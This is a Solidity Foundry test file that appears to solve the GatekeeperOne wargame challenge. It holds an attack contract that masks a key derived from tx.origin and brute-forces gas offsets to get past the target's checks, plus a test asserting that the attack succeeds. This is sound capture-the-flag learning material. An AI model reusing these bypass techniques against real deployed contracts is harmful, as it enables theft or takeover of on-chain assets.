// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "../lib/forge-std/src/Test.sol";
import {GatekeeperOne} from "../src/GatekeeperOne.sol";

/*
-------------------------------
 ATTACK CONTRACT
-------------------------------
*/
contract AttackGatekeeperOne {
    GatekeeperOne public gatekeeperOne;

    constructor(address _gatekeeperOne) {
        gatekeeperOne = GatekeeperOne(_gatekeeperOne);
    }

    function attack() public returns (bool) {
        // Build key based on tx.origin
        uint64 key = uint64(uint160(tx.origin));
        key = key & 0xFFFFFFFF0000FFFF;

        for (uint256 i = 0; i < 300; i++) {
            (bool success,) = address(gatekeeperOne).call{gas: 8191 * 3 + i}
                (abi.encodeWithSignature("enter(bytes8)", bytes8(key)));

            if (success) {
                return true;
            }
        }
        return false;
    }
}

/*
-------------------------------
 TEST
-------------------------------
*/
contract GatekeeperOneTest is Test {
    GatekeeperOne public gatekeeperOne;
    AttackGatekeeperOne public attackerContract;

    address public attacker = address(0xBEEF);

    function setUp() public {
        gatekeeperOne = new GatekeeperOne();

        vm.startPrank(attacker, attacker);
        attackerContract = new AttackGatekeeperOne(address(gatekeeperOne));
        vm.stopPrank();
    }

    function testGatekeeperAttack() public {
        vm.startPrank(attacker, attacker);

        bool success = attackerContract.attack();
        assertTrue(success);
        assertEq(gatekeeperOne.entrant(), attacker);

        vm.stopPrank();
    }

}